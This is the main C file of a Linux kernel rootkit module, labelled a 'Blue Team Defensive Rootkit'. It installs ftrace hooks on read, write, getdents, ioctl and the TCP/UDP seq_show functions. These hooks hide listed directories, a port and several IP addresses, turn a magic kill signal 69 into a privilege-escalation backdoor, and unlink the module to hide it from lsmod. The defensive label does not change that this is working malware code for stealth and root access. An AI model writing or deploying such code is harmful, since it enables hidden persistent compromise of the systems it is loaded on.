/*
 * Advanced Blue Team Defensive Rootkit
 * Features: Directory hiding, Network hiding, Ftrace protection, Privilege escalation
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// Include our custom headers
#include "include/headers.h"
#include "ftrace/ftrace.h"
#include "hooks/read.h"
#include "hooks/write.h"
#include "hooks/getdents.h"
#include "hooks/kill.h"
#include "hooks/ioctl.h"
#include "hooks/network.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("BlueTeam-Defense");
MODULE_DESCRIPTION("Advanced Blue Team Defensive Rootkit - Multi-layer Protection");
MODULE_VERSION("4.0");

// Configuration
#define HIDDEN_PORT 8443
#define MAGIC_KILL_SIGNAL 69
#define MAX_HIDDEN_PREFIXES 10
#define MAX_HIDDEN_IPS 5

// Hidden directory prefixes
static char *hidden_prefixes[MAX_HIDDEN_PREFIXES] = {
    "source-code",
    "classified",
    "internal",
    "backup",
    "forensic",
    "incident",
    ".blueteam",
    ".defense",
    NULL
};

// Hidden IP addresses
static char *hidden_ips[MAX_HIDDEN_IPS] = {
    "10.0.0.100",
    "192.168.1.50", 
    "172.16.0.10",
    NULL
};

// Module state
static int hidden = 0;
static int activate_stealth = 1;

// All our hooks combined
static struct ftrace_hook all_hooks[] = {
    // Ftrace protection
    HOOK("__x64_sys_write", hooked_write, &orig_write),
    HOOK("__x64_sys_read", hooked_read, &orig_read),
    
    // Directory hiding
    HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hooked_getdents, &orig_getdents),
    
    // Privilege escalation backdoor
    HOOK("__x64_sys_kill", hooked_kill, &orig_kill),
    
    // IOCTL protection
    HOOK("__x64_sys_ioctl", hooked_ioctl, &orig_ioctl),
    
    // Network hiding
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
};

// Hide module from lsmod
static void hide_module(void) {
    if (THIS_MODULE && THIS_MODULE->list.prev) {
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}

// Initialize global configuration
void init_rootkit_config(void) {
    // Set global variables that hooks will use
    set_hidden_port(HIDDEN_PORT);
    set_magic_signal(MAGIC_KILL_SIGNAL);
    set_hidden_prefixes(hidden_prefixes);
    set_hidden_ips(hidden_ips);
}

static int __init advanced_rootkit_init(void) {
    int err;
    
    printk(KERN_INFO "[BlueDefense] Loading Advanced Blue Team Rootkit v4.0\n");
    
    // Initialize configuration
    init_rootkit_config();
    
    // Install all hooks
    err = fh_install_hooks(all_hooks, ARRAY_SIZE(all_hooks));
    if (err) {
        printk(KERN_ERR "[BlueDefense] Failed to install hooks: %d\n", err);
        return err;
    }
    
    // Auto-hide module if stealth is enabled
    if (activate_stealth) {
        hide_module();
        printk(KERN_INFO "[BlueDefense] Module hidden from lsmod\n");
    }
    
    printk(KERN_INFO "[BlueDefense] All protection systems active\n");
    printk(KERN_INFO "[BlueDefense] Protected port: %d\n", HIDDEN_PORT);
    printk(KERN_INFO "[BlueDefense] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL);
    
    return 0;
}

static void __exit advanced_rootkit_exit(void) {
    printk(KERN_INFO "[BlueDefense] Removing Advanced Blue Team Rootkit\n");
    
    // Remove all hooks
    fh_remove_hooks(all_hooks, ARRAY_SIZE(all_hooks));
    
    printk(KERN_INFO "[BlueDefense] All hooks removed\n");
}

module_init(advanced_rootkit_init);
module_exit(advanced_rootkit_exit);
